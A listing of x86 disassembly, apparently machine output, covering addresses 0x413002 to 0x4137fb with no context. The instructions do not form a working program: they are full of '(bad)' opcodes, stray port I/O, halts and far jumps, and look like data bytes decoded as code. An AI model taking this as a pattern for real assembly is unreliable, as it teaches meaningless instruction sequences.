  413002:	sub    DWORD PTR [edx-0x9],0x62
  413006:	sahf   
  413007:	popa   
  413008:	(bad)  
  413009:	bound  esi,QWORD PTR [ebp+ebx*2-0x22a895fe]
  413010:	mov    eax,0x625d328e
  413015:	data16 outs dx,BYTE PTR ds:[esi]
  413017:	sar    edx,cl
  413019:	xchg   BYTE PTR [ebx],bh
  41301b:	push   0xffffffe6
  41301d:	jecxz  0x413085
  41301f:	pop    ecx
  413020:	mov    ecx,0xe02cd074
  413025:	or     esp,DWORD PTR [edx+0xa812736]
  41302b:	jl     0x412fb1
  41302d:	cmc    
  41302e:	or     al,BYTE PTR ds:0x85d090de
  413034:	xchg   DWORD PTR [ebx+0x7a72ca5e],esi
  41303a:	repz test esi,0x8ef6934
  413041:	sbb    al,0x79
  413043:	lds    edi,FWORD PTR cs:[esi]
  413046:	fst    QWORD PTR [ebx]
  413048:	enter  0x4416,0x74
  41304c:	and    DWORD PTR [ebx+0x58],0xffffff8b
  413050:	in     al,dx
  413051:	repnz sti 
  413053:	or     eax,0x67f51147
  413058:	jnp    0x41302a
  41305a:	cmp    al,0x79
  41305c:	xor    al,0xb7
  41305e:	or     cl,dl
  413060:	pop    esp
  413061:	leave  
  413062:	data16 mov dh,0x19
  413065:	mov    BYTE PTR [ecx+0x45],al
  413068:	sbb    BYTE PTR [ecx-0x25],bl
  41306b:	cs pushf 
  41306d:	xchg   edi,eax
  41306e:	jno    0x41302f
  413070:	mov    al,gs:0x68c5b56d
  413076:	fild   WORD PTR [edi]
  413078:	cwde   
  413079:	pushf  
  41307a:	or     edx,DWORD PTR [esi-0x5c839aa8]
  413080:	mov    esi,0x6fd374dc
  413085:	dec    eax
  413086:	add    esi,esi
  413088:	jle    0x4130fa
  41308a:	cli    
  41308b:	gs or  edx,ebx
  41308e:	pop    es
  41308f:	jecxz  0x41308f
  413091:	clc    
  413092:	mov    edi,0x9da84939
  413097:	pop    esp
  413098:	loopne 0x413094
  41309a:	or     al,0x99
  41309c:	out    dx,eax
  41309d:	mov    bh,al
  41309f:	push   eax
  4130a0:	mov    dl,0xc4
  4130a2:	adc    al,ch
  4130a4:	outs   dx,DWORD PTR ds:[esi]
  4130a5:	cwde   
  4130a6:	fucom  st(1)
  4130a8:	push   0x1d
  4130aa:	jno    0x41310d
  4130ac:	hlt    
  4130ad:	pop    esi
  4130ae:	addr16 loopne 0x4130be
  4130b1:	and    BYTE PTR [esi+0x7c],bl
  4130b4:	sbb    al,0x44
  4130b6:	push   edx
  4130b7:	(bad)  
  4130b9:	mov    dh,0x24
  4130bb:	sbb    eax,0x848094ee
  4130c0:	mov    ah,0x77
  4130c2:	cdq    
  4130c3:	sbb    eax,0x7a71a9e7
  4130c8:	or     BYTE PTR [edx-0x57bb317e],ah
  4130ce:	adc    eax,0xfd09a78e
  4130d3:	jecxz  0x413121
  4130d5:	cmp    DWORD PTR [ebp-0x5579342d],edi
  4130db:	ss jecxz 0x41310f
  4130de:	jno    0x4130c8
  4130e0:	xor    bl,BYTE PTR ds:0x60ea2d74
  4130e6:	in     eax,0xd9
  4130e8:	adc    eax,0xe10f1f5e
  4130ed:	inc    esp
  4130ee:	xor    al,0xc3
  4130f0:	mov    ds:0x3866f368,al
  4130f5:	dec    ecx
  4130f6:	frstor [esi]
  4130f8:	out    dx,al
  4130f9:	bound  ebp,QWORD PTR [ebp+0x9b04dd]
  4130ff:	lea    eax,[esi+ebp*1-0x4a45a3ed]
  413106:	into   
  413107:	mov    ecx,0x1afc1728
  41310c:	dec    edx
  41310d:	pop    ebx
  41310e:	mov    WORD PTR [edi-0x5d],?
  413111:	dec    edx
  413112:	add    WORD PTR [eax],ax
  413115:	ja     0x413115
  413117:	dec    edx
  413118:	std    
  413119:	into   
  41311a:	fisttp QWORD PTR [ebp-0x1697b66f]
  413120:	mov    eax,0xdf9256c4
  413125:	and    edi,DWORD PTR [esi+ecx*1+0x41]
  413129:	adc    DWORD PTR [esi+0x61],ebp
  41312c:	jp     0x41318c
  41312e:	dec    edi
  41312f:	mov    edi,0x45f6ce24
  413134:	mov    DWORD PTR [edi-0x73f954aa],edx
  41313a:	aaa    
  41313b:	les    esi,FWORD PTR [edx-0xd]
  41313e:	push   ss
  41313f:	out    0xc0,al
  413141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413142:	jae    0x4130d5
  413144:	das    
  413145:	aad    0xc7
  413147:	xchg   ecx,eax
  413148:	jnp    0x413182
  41314a:	jo     0x413134
  41314c:	add    BYTE PTR [eax-0x28],al
  41314f:	pushf  
  413150:	mov    edi,0xdf5fbc5f
  413155:	bound  esi,QWORD PTR [edx+0x40590720]
  41315b:	and    eax,DWORD PTR [edi+0x240dca3]
  413161:	aad    0xf3
  413163:	jle    0x4131b9
  413165:	stos   DWORD PTR es:[edi],eax
  413166:	mov    DWORD PTR [ebp+eax*1-0x78],0x4222b67b
  41316e:	dec    ebx
  41316f:	das    
  413170:	xor    esi,ebx
  413172:	clc    
  413173:	xchg   esp,eax
  413174:	cmc    
  413175:	jnp    0x413157
  413177:	outs   dx,BYTE PTR ds:[esi]
  413178:	xchg   ecx,eax
  413179:	mov    bl,0x54
  41317b:	in     eax,0x24
  41317d:	test   DWORD PTR [edx-0x47c355f2],edi
  413183:	adc    al,0x37
  413185:	xchg   ebx,eax
  413186:	cmp    ah,bh
  413188:	dec    esi
  413189:	imul   ebp,DWORD PTR [edi],0x66
  41318c:	ror    al,cl
  41318e:	jbe    0x41316a
  413190:	inc    ecx
  413191:	mov    eax,0x9e20d127
  413196:	sub    eax,esp
  413198:	jl     0x41319d
  41319a:	stos   DWORD PTR es:[edi],eax
  41319b:	gs sub eax,0xbae25963
  4131a1:	pop    esi
  4131a2:	scas   eax,DWORD PTR es:[edi]
  4131a3:	push   edx
  4131a4:	sub    eax,0x4303373c
  4131a9:	cvtps2pi mm6,xmm3
  4131ac:	lea    ebx,ds:0xa7e7c095
  4131b2:	lds    esi,FWORD PTR [esi+ebp*8+0x41]
  4131b6:	bound  ecx,QWORD PTR [edi]
  4131b8:	leave  
  4131b9:	ins    DWORD PTR es:[edi],dx
  4131ba:	je     0x413177
  4131bc:	add    DWORD PTR [esi],ebp
  4131be:	lds    ebx,FWORD PTR [esp+edx*4+0x59c45416]
  4131c5:	inc    ebx
  4131c6:	inc    esp
  4131c7:	sub    al,0xb2
  4131c9:	data16 loopne 0x4131b4
  4131cc:	cwde   
  4131cd:	xchg   DWORD PTR ds:[ecx+0x37a756fe],ecx
  4131d4:	jne    0x413168
  4131d6:	adc    eax,0x2f08b3d8
  4131db:	aam    0x56
  4131dd:	ss xchg edi,eax
  4131df:	int3   
  4131e0:	or     eax,0x2c3a752d
  4131e5:	or     bl,dh
  4131e7:	add    eax,0xff35d417
  4131ec:	stos   DWORD PTR es:[edi],eax
  4131ed:	nop
  4131ee:	cmp    BYTE PTR [edi-0x63319853],ch
  4131f4:	mov    al,ds:0xc8a43063
  4131f9:	out    0xbf,eax
  4131fb:	or     BYTE PTR [eax-0x96ddcc6],ch
  413201:	js     0x4131b3
  413203:	mov    ds:0xf916d48a,eax
  413208:	add    edx,ebx
  41320a:	jle    0x4131ac
  41320c:	inc    edi
  41320d:	sbb    ebx,DWORD PTR [esi]
  41320f:	push   esp
  413210:	jns    0x413214
  413212:	inc    esp
  413213:	adc    ch,BYTE PTR [esi]
  413215:	adc    DWORD PTR [ebp-0x79],eax
  413218:	push   cs
  413219:	pop    ds
  41321a:	out    0x5b,eax
  41321c:	xlat   BYTE PTR ds:[ebx]
  41321d:	mov    ebx,0x21087d27
  413222:	sub    BYTE PTR [ecx+0x18],bl
  413225:	loop   0x413270
  413227:	mov    edx,0x84a2674
  41322c:	xor    dl,bh
  41322e:	or     al,0x2e
  413231:	arpl   WORD PTR [esi],cx
  413233:	pop    ebx
  413234:	leave  
  413235:	xchg   DWORD PTR [ecx+0x26],esi
  413238:	add    eax,esp
  41323a:	in     al,0xc0
  41323c:	fistp  WORD PTR [ecx]
  41323e:	iret   
  41323f:	xchg   esp,esp
  413241:	jmp    0xa80b:0xea0594de
  413248:	popa   
  413249:	adc    dl,BYTE PTR [ecx+0x7dbb33ee]
  41324f:	addr16 cs mov ecx,esp
  413253:	popa   
  413254:	pop    edx
  413255:	push   esp
  413256:	dec    edi
  413257:	repz dec DWORD PTR [ebp-0x1e]
  41325b:	lods   al,BYTE PTR ds:[esi]
  41325c:	push   es
  41325d:	cmp    ch,dh
  41325f:	xchg   ebx,eax
  413260:	pop    eax
  413261:	shr    ch,1
  413263:	mov    al,dl
  413265:	gs jae 0x4132d1
  413268:	imul   esp,DWORD PTR [eax-0x45],0x877481f7
  41326f:	mov    ah,0xac
  413271:	ret    0xc562
  413274:	test   BYTE PTR [ebp+ebx*2-0x41],bh
  413278:	pusha  
  413279:	pop    ss
  41327a:	aaa    
  41327b:	mov    WORD PTR [ecx],?
  41327d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327e:	sbb    DWORD PTR [ebx-0xc752dde],ebx
  413284:	jl     0x413217
  413286:	push   es
  413287:	test   eax,0x4a17bb6f
  41328d:	mov    dl,0xfc
  41328f:	jae    0x4132da
  413291:	fs xor eax,0x36786711
  413297:	sub    eax,0xbb16e38b
  41329c:	or     edx,DWORD PTR [eax]
  41329e:	cmp    dl,dh
  4132a0:	cwde   
  4132a1:	jbe    0x41323c
  4132a3:	add    al,0x5e
  4132a5:	dec    edi
  4132a6:	rol    BYTE PTR [ebp+0x7daa3e3d],cl
  4132ac:	sub    DWORD PTR [eax],ebp
  4132ae:	or     BYTE PTR [edx],ah
  4132b0:	jl     0x41328f
  4132b2:	es dec ebx
  4132b4:	ja     0x413266
  4132b6:	push   esp
  4132b7:	jb     0x41325e
  4132b9:	xor    eax,0x1ee5e888
  4132be:	ret    0xe560
  4132c1:	xor    DWORD PTR [edi+edx*2+0x417e65c7],ebp
  4132c8:	adc    eax,0xdfa84165
  4132cd:	adc    DWORD PTR [ecx-0x1b],edx
  4132d0:	or     ebx,esp
  4132d2:	mov    ah,0x64
  4132d4:	sub    al,0xf2
  4132d6:	xchg   ebp,eax
  4132d7:	or     DWORD PTR [esi-0x36],esi
  4132da:	rcr    DWORD PTR [esi+0x43],0x38
  4132de:	imul   esp,DWORD PTR [edx],0x50
  4132e1:	cli    
  4132e2:	inc    ecx
  4132e3:	mov    esp,0x41d10c35
  4132e8:	call   0xfd358a14
  4132ed:	mov    cl,0xae
  4132ef:	(bad)
  4132f4:	ins    BYTE PTR es:[edi],dx
  4132f5:	into   
  4132f6:	inc    ecx
  4132f7:	ret    0x71bf
  4132fa:	mov    ecx,?
  4132fc:	jl     0x41328f
  4132fe:	sbb    eax,0x6d9351fe
  413303:	xchg   esp,eax
  413304:	pushf  
  413305:	pop    ds
  413306:	add    eax,0xce8ad0f3
  41330b:	out    dx,al
  41330c:	jno    0x41332c
  41330e:	inc    esp
  41330f:	sti    
  413310:	push   edi
  413311:	or     esp,DWORD PTR [esi+0x6f678159]
  413317:	fs das 
  413319:	fwait
  41331a:	adc    DWORD PTR [edx+0x1a3d8225],esi
  413320:	jb     0x4132c6
  413322:	inc    edi
  413323:	les    esp,FWORD PTR [ecx-0x53fa8f8a]
  413329:	cmp    ah,BYTE PTR [edi+0x49]
  41332c:	and    eax,eax
  41332e:	and    eax,0xe9228022
  413333:	fiadd  DWORD PTR [esi]
  413335:	pop    edx
  413336:	adc    DWORD PTR [edi-0x7a],esi
  413339:	aaa    
  41333a:	dec    esp
  41333b:	aaa    
  41333c:	sbb    bl,BYTE PTR [eax-0x6ed5802c]
  413342:	ds xchg edi,eax
  413344:	dec    edi
  413345:	dec    ecx
  413346:	jecxz  0x413329
  413348:	inc    ebx
  413349:	imul   BYTE PTR [ebx+0x63bbc4d9]
  41334f:	sti    
  413350:	xchg   edi,eax
  413351:	jle    0x4132dd
  413353:	or     al,0xfc
  413355:	adc    BYTE PTR [ecx-0x139a16ee],dh
  41335b:	mov    ah,dh
  41335d:	jnp    0x4133bb
  41335f:	arpl   bp,si
  413361:	ja     0x4132fe
  413363:	jle    0x413326
  413365:	xchg   ebx,ebp
  413367:	xchg   edx,eax
  413368:	push   cs
  413369:	mov    cl,0x8b
  41336b:	inc    edx
  41336c:	and    al,dl
  41336e:	mov    eax,0x95a33db
  413373:	mov    ebp,0x37733ff9
  413378:	(bad)  
  413379:	lock stos BYTE PTR es:[edi],al
  41337b:	xchg   edi,eax
  41337c:	test   eax,0x5ca3e35
  413381:	leave  
  413382:	inc    edx
  413383:	into   
  413384:	cmp    eax,0xecd152b6
  413389:	inc    edx
  41338a:	int    0x4
  41338c:	dec    eax
  41338d:	(bad)  
  41338e:	pop    ebx
  41338f:	mov    es,WORD PTR [edx]
  413391:	mov    ds:0xf4040aa0,eax
  413396:	mov    WORD PTR [eax-0x49b54141],fs
  41339c:	pop    ds
  41339d:	fstp   DWORD PTR [esi+0x7f00dc04]
  4133a3:	in     al,dx
  4133a4:	(bad)
  4133a8:	mov    WORD PTR [eax-0x31f605d6],?
  4133ae:	into   
  4133af:	scas   eax,DWORD PTR es:[edi]
  4133b0:	clc    
  4133b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b2:	mov    dh,0x6b
  4133b4:	iret   
  4133b5:	add    al,0x9b
  4133b7:	(bad)  [eax+0x64]
  4133ba:	popf   
  4133bb:	daa    
  4133bc:	sub    eax,0xc98f7658
  4133c1:	or     BYTE PTR ds:0xff36f233,bl
  4133c7:	cli    
  4133c8:	sub    esp,DWORD PTR fs:[ebx+0x56]
  4133cc:	push   esi
  4133cd:	repz adc cl,BYTE PTR [ecx]
  4133d0:	push   ecx
  4133d1:	sub    al,0x6b
  4133d3:	xor    al,BYTE PTR [esi]
  4133d5:	sti    
  4133d6:	bound  esi,QWORD PTR [eax-0x1635cf96]
  4133dc:	jmp    0x873445d8
  4133e1:	cmp    DWORD PTR [ebp+ecx*4+0x16],ebp
  4133e5:	jle    0x4133d3
  4133e7:	mov    ebp,0xe8e14310
  4133ec:	rcr    BYTE PTR [ebx-0x74],0x1a
  4133f0:	in     eax,dx
  4133f1:	xor    esp,esi
  4133f3:	cmp    edx,ebx
  4133f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133f6:	add    DWORD PTR [edi-0x7e],ebx
  4133f9:	mov    al,bh
  4133fb:	mov    ds:0x4dfb700,al
  413400:	in     eax,dx
  413401:	jns    0x41339d
  413403:	xchg   DWORD PTR ds:0x616c6666,edx
  413409:	adc    ecx,DWORD PTR [edi+eiz*8+0xa145b6f]
  413410:	stos   DWORD PTR es:[edi],eax
  413411:	scas   al,BYTE PTR es:[edi]
  413412:	fisubr DWORD PTR [ebx]
  413414:	xchg   DWORD PTR [ebp+0x14],edx
  413417:	adc    al,0x5b
  413419:	outs   dx,DWORD PTR ds:[esi]
  41341a:	push   ds
  41341b:	popf   
  41341c:	xchg   DWORD PTR [edi-0xe],ebp
  41341f:	add    BYTE PTR [ecx+0x2c1f9085],al
  413425:	sub    ebp,DWORD PTR [esp+ebp*8-0x7bb3d5f7]
  41342c:	inc    ebx
  41342d:	dec    ebx
  41342e:	pop    es
  41342f:	sbb    eax,DWORD PTR [ebp-0x20b0e5ec]
  413435:	leave  
  413436:	inc    BYTE PTR [ebx-0x8ab8ced]
  41343c:	mov    ds:0x75ff30ea,al
  413441:	pop    edi
  413442:	inc    edi
  413443:	inc    ebx
  413444:	push   eax
  413445:	xchg   edx,eax
  413446:	mov    esp,0x1f420646
  41344b:	push   esp
  41344c:	cmp    DWORD PTR [ecx],0xeb2896d8
  413452:	jbe    0x4133df
  413454:	jmp    0xbac96bac
  413459:	adc    dl,cl
  41345b:	and    al,0xac
  41345e:	dec    edx
  41345f:	pop    edi
  413460:	out    dx,eax
  413461:	gs cmc 
  413463:	call   0x73fbb8ef
  413468:	push   ss
  413469:	mov    edi,edi
  41346b:	gs push es
  41346d:	adc    dl,BYTE PTR [edx-0x19bb03b]
  413473:	into   
  413474:	sti    
  413475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413476:	pop    ecx
  413477:	inc    ecx
  413478:	(bad)  
  413479:	arpl   WORD PTR [edx+0x65],sp
  41347c:	jb     0x4134a6
  41347e:	cdq    
  41347f:	fdivr  QWORD PTR [esi+eax*8-0x42908fdf]
  413486:	dec    ebx
  413487:	inc    edx
  413488:	push   edx
  413489:	cmp    ax,WORD PTR [edi+0x55335762]
  413490:	push   cs
  413491:	cmp    BYTE PTR [esi-0x43],dl
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	sub    DWORD PTR [ecx-0x7f],esi
  413498:	(bad)  
  413499:	std    
  41349a:	(bad)  
  41349b:	(bad)  
  41349c:	add    al,0xf5
  41349e:	cs enter 0xd1e9,0xbe
  4134a3:	in     al,dx
  4134a4:	add    bh,BYTE PTR [edx]
  4134a6:	outs   dx,DWORD PTR ds:[esi]
  4134a7:	push   edx
  4134a8:	(bad)  
  4134a9:	std    
  4134aa:	dec    ebx
  4134ab:	into   
  4134ac:	fstp   TBYTE PTR [ecx-0x7e2d1968]
  4134b2:	(bad)  
  4134b4:	mov    dl,0xc9
  4134b6:	or     eax,0x561b63bd
  4134bb:	cmp    ebx,DWORD PTR [esi]
  4134bd:	mov    ecx,0x1ccba19
  4134c2:	cs cmp ebx,eax
  4134c5:	aam    0x7c
  4134c7:	sbb    DWORD PTR [ecx+eiz*1-0x5e],edx
  4134cb:	sar    BYTE PTR [ebx+0x6ee8b57c],cl
  4134d1:	xor    BYTE PTR [eax],cl
  4134d3:	add    ebp,DWORD PTR [ecx+0x7d3c3c9]
  4134d9:	or     BYTE PTR [ecx+0x7e],dh
  4134dc:	sub    al,0x4e
  4134de:	retf   
  4134df:	mov    edi,0x46eb431c
  4134e4:	cwde   
  4134e5:	and    eax,0x579e35e5
  4134ea:	test   eax,0x3e5053f
  4134ef:	adc    DWORD PTR [ecx-0x22284d96],esp
  4134f5:	xchg   ecx,ecx
  4134f7:	ja     0x4134dc
  4134f9:	fbld   TBYTE PTR [eax-0x72613dac]
  4134ff:	icebp  
  413500:	leave  
  413501:	or     al,0x65
  413503:	xchg   DWORD PTR [ecx],edi
  413505:	jns    0x413578
  413507:	cmp    DWORD PTR [eax+0x52],esp
  41350a:	fdivr  st(1),st
  41350c:	push   esp
  41350d:	push   edx
  41350e:	popa   
  41350f:	lock rcr cl,1
  413512:	fwait
  413513:	nop
  413514:	in     eax,dx
  413515:	xchg   ebp,eax
  413516:	out    0xe1,al
  413518:	and    eax,0xa2051384
  41351d:	inc    ebx
  41351e:	int3   
  41351f:	and    cl,BYTE PTR [edx-0x46]
  413522:	fcom   QWORD PTR [esi]
  413524:	mov    al,ds:0xdfba3ba5
  413529:	(bad)  
  41352a:	(bad)
  41352f:	repz adc BYTE PTR [edi+ecx*2+0x563139e3],cl
  413537:	xchg   edx,eax
  413538:	adc    dl,0xf1
  41353b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353c:	jl     0x41357b
  41353e:	mov    ds:0xacafa9ff,al
  413543:	jbe    0x41350c
  413545:	in     al,0x3d
  413547:	mov    WORD PTR [ebx],cs
  413549:	adc    al,0xd1
  41354b:	pushf  
  41354c:	inc    edi
  41354d:	sbb    eax,0x49fc6905
  413552:	xor    al,0x77
  413554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413555:	rol    DWORD PTR [ebx],0x92
  413558:	cmp    al,0x5b
  41355a:	icebp  
  41355b:	mov    edx,0xb7509faf
  413560:	leave  
  413561:	mov    BYTE PTR [esi-0x52c5a29e],al
  413567:	and    eax,DWORD PTR [ecx]
  413569:	jbe    0x4135c5
  41356b:	popf   
  41356c:	aam    0xe3
  41356e:	in     eax,dx
  41356f:	(bad)
  413572:	jmp    0xcba:0xe515aca2
  413579:	add    dl,BYTE PTR [edi-0xa92120d]
  41357f:	lahf   
  413580:	mov    BYTE PTR [eax],bl
  413582:	mov    al,al
  413584:	pusha  
  413585:	inc    edx
  413586:	dec    BYTE PTR [edx]
  413588:	sahf   
  413589:	pop    ecx
  41358a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41358b:	fwait
  41358c:	xchg   edi,esp
  41358e:	bsf    esi,DWORD PTR [esi+ecx*2+0x4e]
  413593:	je     0x413542
  413595:	daa    
  413596:	mov    dl,0xc6
  413598:	int3   
  413599:	mov    ah,0x73
  41359b:	js     0x4135c9
  41359d:	xor    esi,DWORD PTR [edx]
  41359f:	xchg   edi,eax
  4135a0:	jg     0x41358d
  4135a2:	or     DWORD PTR [edx-0x47],esp
  4135a5:	push   0xca79b3db
  4135aa:	ins    DWORD PTR es:[edi],dx
  4135ab:	psubusw mm4,QWORD PTR [ebx]
  4135ae:	jmp    0x5799:0x930a56b6
  4135b5:	or     ebp,DWORD PTR [edx+0x2b]
  4135b8:	(bad)  
  4135b9:	fdivr  st(4),st
  4135bb:	sbb    bh,BYTE PTR [ecx]
  4135bd:	or     DWORD PTR [edi-0x7e436bab],esp
  4135c3:	(bad)  
  4135c4:	nop
  4135c5:	mov    WORD PTR [edx-0x311a76a8],?
  4135cb:	xchg   ecx,eax
  4135cc:	or     DWORD PTR [edx],esp
  4135ce:	outs   dx,BYTE PTR ds:[esi]
  4135cf:	pop    ds
  4135d0:	inc    eax
  4135d1:	aad    0x95
  4135d3:	xor    al,0xa0
  4135d5:	inc    ecx
  4135d6:	fdiv   st(1),st
  4135d8:	dec    edx
  4135d9:	dec    eax
  4135da:	inc    eax
  4135db:	shl    BYTE PTR [esi-0x1ed2fea0],cl
  4135e1:	ret    0x73dd
  4135e4:	mov    WORD PTR [di-0x79],ax
  4135e9:	dec    ecx
  4135ea:	pushf  
  4135eb:	pop    eax
  4135ec:	add    ah,0x2f
  4135ef:	in     al,0xf4
  4135f1:	pop    edi
  4135f2:	lods   eax,DWORD PTR ds:[esi]
  4135f3:	es out 0xaa,al
  4135f6:	inc    edx
  4135f7:	pop    ecx
  4135f8:	mov    fs,WORD PTR [edi-0x146e3871]
  4135fe:	pop    edi
  4135ff:	cmp    ah,BYTE PTR [edx-0x6e92b766]
  413605:	ffreep st(7)
  413607:	stos   DWORD PTR es:[edi],eax
  413608:	fld    QWORD PTR [ebx+0x2e]
  41360b:	inc    edx
  41360c:	in     al,dx
  41360d:	adc    DWORD PTR [esi],ebx
  41360f:	je     0x4135a5
  413611:	add    eax,0xfa3a877e
  413616:	inc    ecx
  413617:	stos   BYTE PTR es:[edi],al
  413618:	add    BYTE PTR [edx+ecx*1],dl
  41361b:	xlat   BYTE PTR ds:[ebx]
  41361c:	or     eax,0x59a3fb73
  413621:	mov    eax,0x43cccc52
  413626:	arpl   sp,cx
  413628:	jno    0x413693
  41362a:	outs   dx,DWORD PTR ds:[esi]
  41362b:	xchg   BYTE PTR [ecx-0x38],ch
  41362e:	cmp    dl,BYTE PTR ds:[ebx+0x57b04d43]
  413635:	jne    0x4135d7
  413637:	xchg   edx,eax
  413638:	jne    0x4135df
  41363a:	enter  0x79e7,0xe6
  41363e:	mov    ds:0x404b1b28,al
  413643:	dec    esi
  413644:	mov    edx,edx
  413646:	retf   
  413647:	mov    ebx,0x6802bea1
  41364c:	xchg   ebp,eax
  41364d:	cld    
  41364e:	jmp    0x4136b2
  413650:	or     BYTE PTR [eiz*1+0x1d237901],bh
  413657:	adc    al,0x32
  413659:	ins    BYTE PTR es:[edi],dx
  41365a:	ss retf 
  41365c:	xor    al,cl
  41365e:	cmp    ebx,eax
  413660:	push   esi
  413661:	test   al,0x80
  413663:	cmp    ebx,ecx
  413665:	xor    BYTE PTR [ecx],ch
  413667:	adc    bh,BYTE PTR [edx-0x615f0221]
  41366d:	mov    ah,0x48
  41366f:	mov    ah,0xb5
  413671:	imul   eax,edx,0x1
  413674:	pop    ebx
  413675:	xchg   DWORD PTR [edi],edx
  413677:	setne  ch
  41367a:	adc    DWORD PTR [ecx-0xac6c967],edx
  413680:	xlat   BYTE PTR ds:[ebx]
  413681:	sbb    cl,ah
  413683:	cmp    eax,0x106edc94
  413688:	jp     0x4136b1
  41368a:	dec    esi
  41368b:	sub    cl,BYTE PTR [eax+0x47]
  41368e:	add    DWORD PTR [edx],ebx
  413690:	or     bh,BYTE PTR [edi-0x24c574d3]
  413696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413697:	push   edi
  413698:	mov    ebp,DWORD PTR [edx+0x61628f50]
  41369e:	loop   0x41366f
  4136a0:	push   eax
  4136a1:	jl     0x41363b
  4136a3:	pop    esp
  4136a4:	pop    es
  4136a5:	mov    esp,0x6aa4150f
  4136aa:	mov    ebp,DWORD PTR [esi]
  4136ac:	lahf   
  4136ad:	test   DWORD PTR ds:[edx+eax*4+0x4db9abbd],ebx
  4136b5:	div    ebp
  4136b7:	mov    ah,0xba
  4136b9:	imul   eax,DWORD PTR [esi+0x27],0x40
  4136bd:	loopne 0x41366b
  4136bf:	and    eax,0x5f3083e8
  4136c4:	ret    
  4136c5:	mov    ds:0x8715d67e,al
  4136ca:	or     al,0xb8
  4136cc:	addr16 and bh,bl
  4136cf:	sar    DWORD PTR [eax+0x728bfdfa],1
  4136d5:	pop    ds
  4136d6:	inc    edi
  4136d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136d8:	repnz retf 
  4136da:	xchg   DWORD PTR [edx],edx
  4136dc:	sbb    edx,0xffffffd3
  4136df:	inc    ecx
  4136e0:	push   0xffffffdc
  4136e2:	(bad)
  4136e6:	xor    esi,DWORD PTR [esi+ecx*4-0x5a]
  4136ea:	jecxz  0x41366f
  4136ec:	cli    
  4136ed:	cwd    
  4136ef:	lods   eax,DWORD PTR ds:[esi]
  4136f0:	dec    ebp
  4136f1:	adc    dl,BYTE PTR [edi-0xa30b1a8]
  4136f7:	cs and eax,edi
  4136fa:	cdq    
  4136fb:	ja     0x4136f5
  4136fd:	cdq    
  4136fe:	nop
  4136ff:	lahf   
  413700:	les    ecx,FWORD PTR [esi]
  413702:	(bad)  
  413704:	jmp    0x46a1cbc8
  413709:	mov    eax,0xc4bc03b6
  41370e:	fcomip st,st(3)
  413710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413711:	inc    ebx
  413712:	aam    0x33
  413714:	(bad)  [edi+eax*4]
  413717:	ror    DWORD PTR [esi+0x39],cl
  41371a:	dec    esi
  41371b:	hlt    
  41371c:	outs   dx,BYTE PTR ds:[esi]
  41371d:	jbe    0x41378b
  41371f:	daa    
  413720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413721:	jne    0x41370f
  413723:	jl     0x413795
  413725:	call   0xec79:0x161656d3
  41372c:	out    dx,al
  41372d:	sub    BYTE PTR [esi],dh
  41372f:	fsubr  QWORD PTR [esi+0x6a]
  413732:	fwait
  413733:	inc    ebp
  413734:	adc    eax,0xf27e5592
  413739:	add    BYTE PTR [edi],al
  41373b:	(bad)  
  41373c:	(bad)  
  41373d:	jg     0x413752
  41373f:	call   0x57b93cf0
  413744:	sbb    BYTE PTR [ebx],dh
  413746:	inc    BYTE PTR [eax]
  413748:	mov    ds:0xb92d473,eax
  41374d:	(bad)  
  41374e:	(bad)  
  41374f:	ficom  WORD PTR [esi]
  413751:	or     al,BYTE PTR [eax+0x39]
  413754:	pop    eax
  413755:	sbb    eax,0xe0619f8
  41375a:	daa    
  41375b:	mov    ?,WORD PTR [ebp+0x3707b4c2]
  413761:	ins    DWORD PTR es:[edi],dx
  413762:	mov    ah,0x30
  413764:	add    ecx,DWORD PTR [ebx-0x4e]
  413767:	das    
  413768:	sbb    eax,0x8b4bb358
  41376d:	push   esp
  41376e:	inc    eax
  41376f:	dec    ebx
  413770:	mov    ecx,DWORD PTR [eax-0x7215538c]
  413776:	sti    
  413777:	xor    DWORD PTR [esi-0x5ef65ac7],edi
  41377d:	pop    ds
  41377e:	lods   eax,DWORD PTR ds:[esi]
  41377f:	dec    esi
  413780:	sub    eax,0x83529c9f
  413785:	inc    eax
  413786:	pop    esp
  413787:	mov    ds:0xa921a03e,eax
  41378c:	lds    esp,FWORD PTR [ebp-0x48]
  41378f:	fcom   QWORD PTR ds:0x597114b2
  413795:	pop    es
  413796:	pusha  
  413797:	arpl   WORD PTR [ecx+edi*1-0x5a72b4a7],cx
  41379e:	fld    QWORD PTR [edi+0x2618da4c]
  4137a4:	scas   eax,DWORD PTR es:[edi]
  4137a5:	lea    edi,[edi]
  4137a7:	in     al,dx
  4137a8:	or     bh,BYTE PTR [edx]
  4137aa:	dec    edi
  4137ab:	loope  0x4137a1
  4137ad:	jg     0x41382d
  4137af:	jecxz  0x41381e
  4137b1:	in     al,dx
  4137b2:	inc    esi
  4137b3:	or     ebp,eax
  4137b5:	cmp    DWORD PTR [eax+0x6b],esi
  4137b8:	mov    cl,0xf0
  4137ba:	jo     0x41375c
  4137bc:	jbe    0x4137d2
  4137be:	or     eax,0x7ebcb2cd
  4137c3:	adc    al,0x8b
  4137c5:	aaa    
  4137c6:	and    ebp,0x682df06e
  4137cc:	popa   
  4137cd:	jbe    0x413762
  4137cf:	push   0xffffffad
  4137d1:	jg     0x41380d
  4137d3:	cmc    
  4137d4:	sub    DWORD PTR [ebp+0x46],ebx
  4137d7:	mov    edi,0xae91a177
  4137dc:	mov    al,0xeb
  4137de:	repnz fld DWORD PTR [edi+0x5d]
  4137e2:	xchg   ecx,edi
  4137e4:	adc    DWORD PTR [edx],esi
  4137e6:	mov    esp,0xe2663720
  4137eb:	pop    DWORD PTR [esi+esi*2+0x660c3f2a]
  4137f2:	jl     0x4137d6
  4137f4:	repz out 0x17,eax
  4137f7:	pop    ebp
  4137f8:	ds mov bl,0x8f
  4137fb:	xchg   al,al
